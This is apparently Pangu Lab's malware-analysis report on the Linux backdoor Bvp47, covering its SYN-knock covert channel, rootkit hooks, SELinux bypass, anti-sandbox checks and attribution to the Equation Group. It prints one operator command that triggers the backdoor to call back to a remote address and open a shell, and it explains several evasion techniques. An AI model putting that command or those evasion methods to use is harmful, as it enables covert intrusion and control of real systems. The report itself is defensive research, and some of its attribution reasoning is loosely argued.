1. Executive Summary
In a certain month of 2013, during an in-depth forensic investigation of a host in a key domestic department, researchers from the Pangu Lab extracted a set of advanced backdoors on the Linux platform, which
used advanced covert channel behavior based on TCP SYN packets, code obfuscation, system hiding,
and self-destruction design. In case of failure to fully decrypt, It is further found that this backdoor needs
the check code bound to the host to run normally. Then the researchers cracked the check code and successfully ran the backdoor. Judging from some behavioral functions, this is a top-tier APT backdoor, but
further investigation requires the attacker's asymmetric encrypted private key to activate the remote control function. Based on the most common string "Bvp" in the sample and the numerical value 0x47 used in
the encryption algorithm, the team named the corresponding malicious code "Bvp47" at the time.
In 2016 and 2017, “The Shadow Brokers” published two batches of hacking files claimed to be used by
“The Equation Group”. In these hacking files, researchers form Pangu Lab found the private key that can
be used to remotely trigger the backdoor Bvp47. Therefor, It can be concluded that Bvp47 is a hacker tool
belonging to " The Equation Group".
Through further research, the researchers found that the multiple procedures and attack operation manuals disclosed by "The Shadow Broker" are completely consistent with the only identifier used in the NSA
network attack platform operation manual [References 3 and 4] exposed by CIA analyst Snowden in the
"Prism" incident in 2013.
In view of the US government's prosecution of Snowden on three charges of "spreading national defense
information without permission and deliberately spreading confidential information", it can be determined
that the documents published by "The Shadow Brokers" are indeed NSA, which can fully prove that ” The
Equation Group” belongs to NSA, that is, Bvp47 is the top-tier backdoor of NSA. Besides the files of “The
Shadow Brokers” revealed that the scope of victims exceeded 287 targets in 45 countries, including
Russia, Japan, Spain, Germany, Italy, etc. The attack lasted for over 10 years. Moreover, one victim in
Japan is used as a jump server for further attack.
Pangu Lab has a code named “Operation Telescreen” for several Bvp47 incidents. Telescreen is a device
imagined by British writer George Orwell in his novel “1984”. It can be used to remotely monitor the person
or organization deploying the telescreen, and the "thought police" can arbitrarily monitor the information
and behavior of any telescreen.
The Equation Group is the world's leading cyber-attack group and is generally believed to be affiliated with
the National Security Agency of the United States. Judging from the attack tools related to the organization, including Bvp47, Equation group is indeed a first-class hacking group. The tool is well-designed, powerful, and widely adapted. Its network attack capability equipped by 0day vulnerabilities was unstoppable,
and its data acquisition under covert control was with little effort. The Equation Group is in a dominant position in national-level cyberspace confrontation.

2. Unseen Backdoor
In a certain month of 2015, an advanced threat detection system deployed by a customer prompted a special network intrusion alarm, and there were suspicious communication activities between important servers. During the incident response process, packets were captured at several nodes in the network and the
server’s information was obtained by disk mirroring. After preliminary analysis, at least two servers in the
system network have been hacked and implanted with backdoors, and there are signs of a relatively large
amount of data leakage
The investigation of the incident involved 3 servers, one of which was the source of external attacks, host
A, and the other two internally affected servers, V1 (mail server) and V2 (a business server). There is
abnormal communication between external host A and the V1 server. Specifically, A first sends a SYN
packet with a 264-byte payload to port 80 of the V1 server (normal SYN packets generally do not carry a
Payload), and then the V1 server immediately initiates an external connection to the high-end port of the
A machine and maintains a large amount of exchange data. Data communication is encrypted.
At almost the same time, the V1 server connects to the V2 server's SMB service and performs some sensitive operations, including logging in to the V2 server with an administrator account, trying to open terminal
services, enumerating directories, and executing Powershell scripts through scheduled tasks.
At the same time, the V2 server connected to the 8081 port of the V1 server to download suspicious files,
including the Powershell script and the encrypted data of the second stage.
A simple HTTP server implemented in Python was started on port 8081 of the V1 server, and the V2 server
obtained two files from the above: index.html and index.htm. Among them, index.html is a Base64-encoded Powershell script. After this script is executed on the server, it will continue to download a file named
index.htm from the V1 server. The content is Base64-encoded data, but after decoding it is found to be an
unreadable string. Analysis of the Powershell script executed to download index.htm proves that this is a
piece of asymmetrically encrypted data.
Next, the V2 server connects to the high-end port of the V1 server to communicate with its own protocol,
and a large amount of interactive transmission data is encrypted.

Based on the above observations, it can be inferred from the above analysis that the V1/V2 servers have
been implanted with backdoors. By integrating the overall interaction of the A machine and the V1/V2
server, we can restore the communication process between the machines as follows:
1. Machine A connects to port 80 of the V1 server to send a knock request and start the backdoor program
on the V1 server;
2. The V1 server reversely connects the high-end port of machine A to establish a data pipeline;
3. The V2 server connects to the backdoor web service opened on the V1 server, and obtains PowerShell
execution from the V1 server;
4. The V1 server connects to the SMB service port of the V2 server to perform command operations;
5. The V2 server establishes a connection with the V1 server on the high-end port and uses its own encryp
tion protocol for data exchange;
6. The V1 server synchronizes data interaction with the A machine, and the V1 server acts as a data trans
fer between the A machine and the V2 server;
This is a backdoor communication technology that has never been seen before, implying an organization
with strong technical capabilities behind it.

3. Backdoor Overview – Bvp47
After some effort, our forensic team successfully extracted the backdoor file on the compromised machine
and found that the string "Bvp" is more common in the sample file and the value 0x47 is used in the encryption algorithm. We will temporarily name the sample file " Bvp47".

Payload
The basic file structure of Bvp47 includes two parts: loader and payload. The loader is mainly responsible
for the decryption and memory loading of the payload. The payload is compressed and encrypted. The 18
slices are simply divided into three types T0, T1, T2, named Slice0x00-Slice0x11:
- T0{Slice0x00}
- T1{Slice0x01-Slice0x10}
- T2{Slice0x11}
After decompression analysis, the sizes of the 18 slices of Bvp47 are as follows:

Usage Scenario
Our team reproduced the use of the Bvp47 backdoor in our own environment and roughly clarified its
usage scenarios and basic communication mechanisms. As an important backdoor platform for long-term
control of victims after a successful invasion, Bvp47 generally lives in the Linux operating system in the
demilitarized zone that communicates with the Internet. It mainly assumes the core control bridge communication role in the overall attack, as shown in the following figure:

Attacker(SYN Knock)
Hacker

Internet（e.g. 443port）

GateWay
Router/Firewall

TCP

Lateral movement

Internal Server

DMZ
Email server etc.

After analysis, the actual network attack data packet process was restored.

The process of covert communication between Bvp47 and the control server is as follows:
1. Once the control end (192.168.91.131) sends a TCP protocol SYN packet with a certain length of a
specific payload (length is 136 bytes) to the "victim IP" (192.168.91.128); 1357 port (the live port can
be reused directly);
2. After receiving the special SYN packet, the "victim IP" (192.168.91.128) will immediately follow the
instructions to connect to port 2468 of the "control end";
3. The "victim IP" (192.168.91.128) enters the controlled process;
Bvp47 exploits one weakness that common network detection devices generally do not check data packets
during the TCP handshake. Bvp47 injects data in the first SYN packet in order to avoid detection by
network security devices.
[Step 1] The payload data in the mentioned SYN packet is as follows:

[Step 3] The content of the packet sent by the victim IP after the successful TCP handshake is as follows:

In the analysis later in this article, Bvp47 builds its covert communication system from cryptography,
network, and Linux OS. Such covert communication system is cutting edge and can be seen as an advanced
version of "SYNKnock" (old version of Cisco devices only conduct simple verification).

4. Attacker Correlation and Attribution
“The Shadow Brokers Leaks” Incident Correlation
In 2016, a hacker group named Shadow Broker released two compressed files, eqgrp-free-file.tar.xz.gpg
and eqgrp-auction-file.tar.xz.gpg, claiming to have compromised the United States NSA's Equation group.
The compressed file contains a large number of hacking tools of Equation group. Among them, the
eqgrp-free-file.tar.xz.gpg compressed file is available for public download for inspection, and the other is
sold at a current price of 1 million bitcoins for the decompression password of the eqgrp-auction-file.tar.xz.gpg file. However, no one would buy it. Finally, Shadow Broker chose to publish the decompression password of eqgrp-auction-file.tar.xz.gpg in April 2017.
In the process of analyzing the eqgrp-auction-file.tar.xz.gpg file, it was found that Bvp47 and the attacking
tools in the compressed package were technically deterministic, mainly including “dewdrops”, “solutionchar_agents”, “tipoffs”, “StoicSurgeon”, “insision” and other directories. The “dewdrops_tipoffs” contains
the private key required by Bvp47 for RSA public-private key communication. On this basis, it can be confirmed that Bvp47 is from Equation group.

Among them, “dewdrops” and “solutionchar_agents” are integrated into the Bvp47 sample platform as
component functions, and the “tipoffs” directory is the control end of the Bvp47 remote communication.

Asymmetric Algorithm Private Key Match
The “tipoffs” directory contains the RSA asymmetric algorithm private key used in the Bvp47 covert channel. That RSA private key is vital to Bvp47's command execution and other operations.

Samples In-depth Correlation
The user.tool.stoicsurgeon.COMMON file in the eqgrp-auction-file.tar.xz.gpg file\Linux\doc\old\etc\ directory describes how to use the tipoff-BIN tool, and also reveals a series of Information:
1. Bvp47 contains the module named "dewdrop", which can be triggered by the RSA private key of moudle
"tipoff";
2. File COMMON descript a backdor named "StoicSurgeon", namely a stoic surgeon, a multi-platform
advanced rootkit backdoor, which can be combined use with "dewdrop";
3. "StoicSurgeon" also has a little brother, "Incision", which is an incision and a rootkit backdoor;
4. During invasion, "Incision" can be upgraded to "StoicSurgeon";

The operating system supported by dewdrop basically covers mainstream Linux distributions, JunOS,
FreeBSD, Solaris, etc.

Full Control Command Line
Bounce back connection operation of Bvp47 backdoor can be done by following command:

#./tipoffs/dewdrop_tipoff --trigger-address 11.22.33.44 --target-address
12.34.56.78 --target-protocol tcp --target-port 1357 --callback-address 13.24.57.68
--callback-port 2468 --start-ish

Among them, ish corresponds to the file ish in the \eqgrp-auction-file\Linux\bin directory, combined with
the leaked ish tool, successfully activated the backdoor Bvp47, completed the remote download execution
function, and opened the remote shell.

In addition, there are other commands to remotely execute the specified program:

Connection with Snowden Incident
In December 2013, the German media "Der Spiegel" published an NSA ANT catalog with 50 pictures. This
is a series of top-secret materials compiled by the NSA in 2008-2009, including the use of a series of
advanced hacking tools. The source of information may come from Edward Snowden or another unknown
intelligence provider [Reference 3].
The FOXACID-Server-SOP-Redacted.pdf file in the NSA ANT catalog [Reference 4], that is, the "Acid Fox"
Project-Server Standard Operating Procedure Revision, NSA Vulnerability Attack Operating Platform
Functional Description and User Manual, in this standard work. The document describes the mandatory
unique identification code required for the job, "ace02468bdf13579".

Beijing Qi An Pangu Laboratory Technology Co., Ltd

www.pangulab.cn

13

In the compressed eqgrp-free-file.tar.xz.gpg leaked by Shadow Brokers, SecondDate-3021.exe， in the
\eqgrp-free-file\Firewall\BANANAGLEE\BG3000\Install\LP\Modules\PIX\ directory， also has a unique
identification code of "ace02468bdf13579", and the file name “SecondDate” conforms to the standard of
operation document.

If SecondDate-3021.exe is just a coincidence, string "ace02468bdf13579" appears in the 47 files related
to the tool named SecondDate in the leaked tool set, which is obviously not a coincidence that can be
explained.
And in a SecondDate file named \eqgrp-free-file\Firewall\SCRIPTS\ directory, it describes how to use
SecenData, which is consistent with the description of FOXACID-Server-SOP-Redacted.pdf mentioned
earlier.

Beijing Qi An Pangu Laboratory Technology Co., Ltd

www.pangulab.cn

14

After analyzing more than 90 programs related to SecondDate, it is found that the SecondDate program
spans multiple platforms and architectures, such as Windows, Linux, Solaris, etc. The types from executable files to shellcode are very comprehensive, and it has undergone multiple iterations of the lowest
version. 1.3.0.1 was created in May 2007, and the highest version 3.0.3.6 was created in October 2013.
The starting time was in line with the top-secret electronic monitoring plan implemented in 2007 as
described by the PRISM Project (PRISM), and it lasted as long as 6 years. The iterative version, perfect
cross-platform, support for various architectures, and diversified startup methods imply the strong organizational and technical capabilities behind the project.
Moreover, the relationship between STOICSURGEON and the SECONDDATE program is also clarified in
the opscript.txt in the "EquationGroup-master\Linux\etc" directory:

Therefore, there are enough reasons to believe that the two compressed files leaked by Shadow Brokers
in 2016 and 2017 belonged to the NSA Equation group’s hacking tools.

Bvp47—US NSA’s Top-tier Backdoor
1. The unique feature identifier "ace02468bdf13579" in the hacker tool mentioned in the material of the
NSA ANT catalog FOXACID-Server-SOP-Redacted.pdf has appeared in the tool set of "The Shadow
Brokers Leaks" many times;
2. The RSA private key in the Bvp47 backdoor program exists in the tool tipoff-BIN of "The Shadow Brokers
Leaks";
3. Use the tool tipoff-BIN of "The Shadow Brokers Leaks" to directly activate the moule Dewdrops of the
backdoor Bvp47, and Dewdrop and STOICSURGEON were belong to the same series backdoor ;
4. It is finally determined that the Bvp47 backdoor is assembled by the "The Shadow Brokers Leaks" tool
module, that is, Bvp47 belongs to the top backdoor of the Equation group of US NSA;

Among the many clues of attacks against China, the earliest one can be traced back to 2002:

Exploit the victim host as a jump server to attack target
There was a network traffic evidence indicated that attacker would exploit the victim host as a jump server
or C2 to attack target, namely, 210.135.90.0/24 in Japan played a C2 server in 2015.

6. Detailed Techniques of
Bvp47 Backdoor
The implementation of Bvp47 includes complex code, segment encryption and decryption, Linux multi-version platform adaptation, rich rootkit anti-tracking techniques, and most importantly, it integrates advanced
BPF engine used in advanced covert channels, as well as cumbersome communication encryption and
decryption process.
This chapter will analyze the above aspects.

Main Behaviors
There are several key points in the program initialization as follows:
1. Linux user mode and kernel mode. The process in user mode will remain alive
2. Initialize the Bvp engine
3. A series of environmental tests. If environmental information do not meet requirements, sample will be
automatically deleted.
4. A series of payload block decryption
5. Tamper with kernel devmem restrictions. This will allow process in user mode to directly read and write
kernel space. And other kernel techniques are used as well.
6. Load non-standard lkm module files
7. Hook system function in order to hide its own process, file, network, and self-deleting detection in the
covered channel communication as follows:
a . After Bvp47 receives the SYN packet sent by the server, it will match the packet format in BPF filter
rules (see below)
b . Only after satisfying the BPF rules in operation 1, encryption algorithms such as RSA+RC-X will be
decrypted;
c . Perform corresponding command operations according to the decrypted instructions;

27

Payload
The entire file of Bvp47 adopts the commonly used backdoor packaging method, that is, the backdoor
function modules are compressed and assembled and then placed at the end of the file, and the whole file
exists in the form of additional data. The additional data is loaded through the loader function module built
into the program, which mainly completes the following steps:

Read
Check
Unzip
Decryption
Load
The main data structure of payload is as follows:

The specific content corresponding to the sample is as follows:

28

The parsed result using 010Editor is as follows :

29

In terms of decryption, the loader of the payload will do followings:
1. Call four different decryption functions (the underlying decryption method is the same) to complete the
decompression operation of each slice;
2. After completing operation 1, the loader will continue to call the Xor 0x47 algorithm (see other chapters)
to complete the decryption of slice.
The specific decryption functions are as follows:

30

Strings Encryption
In the Bvp47 sample, many strings and blocks are encrypted to lower the possibility of exposure. These
encryption techniques are mainly based on XOR operation. These subtle encryptions will cause considerable analysis costs to the researchers.
According to the analysis, there are mainly 8 kinds of XOR operations:

The algorithm of 0xa8a16d65_xor is as follows:

31

Techniques of Function Name Obfuscation
The export functions of some code slice modules in Bvp47's payload generally use the form of "digital
names" to provide interface services to external. Such confusion creates a big obstacle for researchers in
analyzing the function analysis of the export interface:

32

Bvp Engine
To improve its versatility, Bvp47 uses many dynamic calculations of Linux kernel data and function
addresses. At the same time, to be fundamentally compatible with a large amount of Linux kernel data and
various independently developed sections of the payload, they developed the Bvp engine to dynamically
redirect and adapt the system functions and data structures required by Bvp47 in compilation and runtime.
The Bvp engine adapts many functions and data structures:

There is a structure used to record and describe Bvp engine information in both 0x0b and 0x10:

Parsed result of the Bvp engine format in 0x0b:

The MD5 value calculation method in the above figure is to read the content of /proc/version, and directly
calculate the MD5 value as the unique identifier of the operating system kernel. Different versions of the
kernel will correspond to the corresponding MD5 and structure values.
To verify the accuracy of the MD5 value, a series of kernel versions are collected as follows:

And perform MD5 calculation on the kernel information, that is, the content of /proc/version (the MD5
values marked with the digital version number in the upper half of the figure can be found in Bvp47, and
they are all affected system versions):

System Hook
Bvp47 mainly hooks nearly 70 process functions in the Linux operating system kernel, which are mainly
used to hide network, process, file, and SeLinux bypass, etc. More details are as follows:

Bvp47 aims to hide its own files and trigger the self-deleting process by hooking __d_lookup function. The
hooking procedure is also to verify if upper layer application access /usr/bin/modload file. First part of the
handle function is as follows:

In the handler function, a lot of techniques of instant function search are used:

Example 3: Comparison of the hook of the avc_has_perm function:

By leveraging internal inline hook to avc_has_perm, Bvp47 can bypass SeLinux for any operations without
limitation.

AV Evasion in Kernel Module
Bvp47 will modify the first four bytes of the elf file of the kernel module to avoid memory search for elf and
load it through its own lkm loader.

BPF Covert Channel
BPF (Berkeley Packet Filter) is a kernel engine used in the Linux kernel to filter custom format packets. It
can provide a set of prescribed languages for ordinary process in user layer to filter the specified data
packets.
Bvp47 directly uses this feature of BPF as an advanced technique at the Linux kernel level in the covert
channel to avoid direct kernel network protocol stack hooks from being detected by researchers.
The specific BPF usage are as follows. Only SYN packets (including UDP packets) that meet the rules will
be sent to the next step for encryption and decryption:

46

The common BPF Trigger data packet is a TCP packet, and the total size of the data carried by the TCP
packet is 0x88 bytes. The structure of the Trigger Packege field is shown in the figure:

Field structure diagram:

The red part: the data length is 0x0088 XOR 0xE6CF;
The green part: the actual length of the decrypted data;
The dark blue part: purple Random and 0x9D6A XOR;

Channel Encryption and Decryption
Bvp47 uses asymmetric algorithms RSA and the RC-X algorithm as a guarantee for the security of the
communication link. Intermediate calculations will involve factors such as the time and length of sending
and receiving packets. Some of the key pairs are as follows:

After receiving the rebound command, Bvp47 will start the decryption process:

Runtime Environment Detection
To better protect itself, Bvp47 has made a series of operating environment tests to prevent security
researchers from directly performing dynamic analysis after the sample is obtained. After decrypting the
first block of the payload, a 32-bit unsigned integer value will be obtained. This value is mainly used as a
checksum to verify the operating environment. The specific verification method is as follows:
1. Loader executes statvsf("/", &stats);
2. Get operation 1 blocks and files in the execution result;

3. Compare the results of blocks ^ files == checksum ?. If they are equal, it is judged that the current environment meet requirements of running;

Other Techniques
1. Use setrlimit api to set the core dump file size to 0 to prevent sample extraction;
2. Anti-sandbox technology combined with argv[0] and lstat;
Untrusted programs are often run by sandboxes and monitor behavior. When the program is running,
it often does not really land, that is to say, the path pointed to by argv[0] at this time is not the real path
of the program. The program calls lstat through syscall to bypass the Hook of SandboxRing3 and check
whether the file pointed to by argv[0] really exists.

3. mkstmp anti-sandbox technology
API used to generate temporary files in the Linux /tmp directory when mkstmp. (from our assumption:
because the sandbox did not provide support for this API at the time, or the sandbox policy disabled
mkstmp. Therefore, the success of the mkstmp call can be used to identify the sandbox).

4. /boot anti-sandbox technology
There are often only two directories in the /boot directory in the sandbox: /boot/. and /boot/... So if you
open the /boot directory to count the number of files in the /boot directory, you can often identify the
sandbox. (On Windows, the number of temporary files in the TEMP directory will be passed).

5. API Flooding and Delayed Execution
Any sandbox will only allocate a limited amount of time to each sample. Therefore, many legitimate
APIs are called to delay execution to avoid the initiation analysis of the sandbox.

7. Summary
As an advanced attack tool, Bvp47 has allowed the world to see its complexity, pertinence and
forward-looking. What is shocking is that after analysis, it has been realized that it may have existed for
more than ten years. According to the information learned through Shadow Brokers Leaks and NSA ANT
catalog channels, the engineering behind it basically involves the full *nix platform, and the advanced
SYNKnock covert channel technology it uses may involve the Cisco platform, Solaris, AIX, SUN and even
the Windows platform.
What kind of force is driving its development? It may be possible to get some answers from multiple victim
units, which generally come from key departments of the state.
Pangu Lab as a cyber security team that insists on high-precision technology-driven, we soberly aware of
the powerful ability of the world's super-class APT group in attacking technology. We could only protect
users in future cyber confrontations by actively exploring of the cutting-edge technology of information
security attack and defense, keeping tracking important incidents, and coordinating with cybersecurity
professionals globally.
